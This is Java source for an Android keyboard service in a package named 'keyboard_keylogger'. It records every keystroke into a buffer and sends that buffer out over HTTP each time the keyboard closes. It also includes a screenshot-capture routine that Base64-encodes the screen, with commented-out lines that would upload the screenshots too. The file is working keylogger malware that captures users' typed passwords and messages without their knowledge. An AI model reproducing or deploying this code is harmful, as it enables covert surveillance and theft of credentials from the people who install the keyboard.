package com.example.keyboard_keylogger;


import android.graphics.Bitmap;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.os.Environment;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;

public class MyService extends InputMethodService implements KeyboardView.OnKeyboardActionListener{

    private KeyboardView kv;
    private Keyboard keyboard;
    private ArrayList<Character> keyBuffer;
    private boolean isCaps = false;

    @Override
    public void onFinishInputView(boolean finishingInput) {
//        String slika = takeScreenshot();
//        System.out.println(slika);
        //new HTTPReqTask().setBody(slika).execute();
        //System.out.println("onFinishInputView called");
//        System.out.println(keyBuffer);
//        String jsonInputString = "{\"slova\": "+keyBuffer+" }";
//        new HTTPReqTask().setBody(jsonInputString).execute();
        new HTTPReqTask().setBody(keyBuffer.toString()).execute();
        keyBuffer.clear();
        super.onFinishInputView(finishingInput);
    }

    @Override
    public View onCreateInputView(){
        System.out.println("Input method created!");
        keyBuffer = new ArrayList<>();
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard,null);
        keyboard = new Keyboard(this,R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    @Override
    public void onPress(int i) {

    }

    @Override
    public void onRelease(int i) {

    }

    @Override
    public void onKey(int i, int[] ints) {
        InputConnection ic = getCurrentInputConnection();
        //playClick(i);

        keyBuffer.add((char)(i));
        System.out.println(i);
        switch (i) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1,0);break;
            case Keyboard.KEYCODE_SHIFT:
                isCaps =!isCaps;
                keyboard.setShifted(isCaps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN,KeyEvent.KEYCODE_ENTER));break;
            default:
                char code = (char)i;
                if (Character.isLetter(code) && isCaps) code = Character.toUpperCase(code);
                ic.commitText(String.valueOf(code),1);

        }
    }

    @Override
    public void onText(CharSequence charSequence) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }


    private String takeScreenshot() {
        Date now = new Date();
        android.text.format.DateFormat.format("hh-mm-ss", now);
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        byte[] byteArray = stream.toByteArray();
        try {
            // create bitmap screen capture
            View v1 = this.getWindow().getWindow().getDecorView().getRootView();

            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());

            bitmap.compress(Bitmap.CompressFormat.PNG,100,stream);
            byteArray = stream.toByteArray();


        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            e.printStackTrace();
        }
        String imageEncoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
        System.out.println("SCREENSHOT CREATED");
        System.out.print(imageEncoded);
        return imageEncoded;
    }
}